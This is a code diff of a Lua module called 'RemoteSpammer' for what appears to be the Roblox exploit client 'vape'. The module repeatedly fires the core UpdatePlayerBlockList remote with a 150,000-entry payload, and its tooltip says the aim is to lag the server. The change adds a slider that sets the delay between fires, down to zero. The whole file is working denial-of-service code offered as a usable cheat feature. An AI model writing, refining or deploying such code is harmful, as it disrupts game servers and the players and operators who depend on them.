@@ -1,43 +1,31 @@
 local RemoteSpammer
-local blockListRemote
+local Threshold
 local PAYLOAD_SIZE = 150000
 
--- the size of the payload is what makes the spam expensive, so it is built once per
--- enable and reused instead of being rebuilt per fire
-local function getPayload()
-	local payload = table.create(PAYLOAD_SIZE)
-	for index = 1, PAYLOAD_SIZE do
-		payload[index] = {id = index, v = index * 2}
-	end
-
-	return payload
-end
-
--- a roblox core remote, so it is resolved lazily and re-checked rather than trusted
--- to stay where it was when the module was enabled
-local function getBlockListRemote()
-	if blockListRemote and blockListRemote.Parent then
-		return blockListRemote
-	end
-
+local function getRemote()
 	local container = game:FindFirstChild('RobloxReplicatedStorage')
 	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
-	if remote and (remote:IsA('RemoteEvent') or remote:IsA('UnreliableRemoteEvent')) then
-		blockListRemote = cloneref(remote)
-		return blockListRemote
-	end
+	return remote and cloneref(remote)
 end
 
 RemoteSpammer = vape.Categories.World:CreateModule({
 	Name = 'RemoteSpammer',
 	Function = function(callback)
 		if callback then
-			local payload = getPayload()
+			-- built once per enable, the size is what makes each fire expensive
+			local payload = table.create(PAYLOAD_SIZE)
+			for index = 1, PAYLOAD_SIZE do
+				payload[index] = {id = index, v = index * 2}
+			end
+
+			local fireDelay = os.clock()
 			notif('RemoteSpammer', 'Spamming the block list remote.', 5)
 
 			repeat
-				local remote = getBlockListRemote()
-				if remote then
+				local remote = getRemote()
+				local now = os.clock()
+				if remote and fireDelay < now then
+					fireDelay = now + Threshold.Value
 					-- a payload this large can be rejected, which must not kill the spam
 					pcall(remote.FireServer, remote, payload)
 				end
@@ -47,4 +35,12 @@ RemoteSpammer = vape.Categories.World:CreateModule({
 		end
 	end,
 	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
+})
+Threshold = RemoteSpammer:CreateSlider({
+	Name = 'Threshold',
+	Min = 0,
+	Max = 1,
+	Default = 0.1,
+	Decimal = 100,
+	Tooltip = 'Seconds between each fire, 0 fires as fast as the loop runs.'
 })
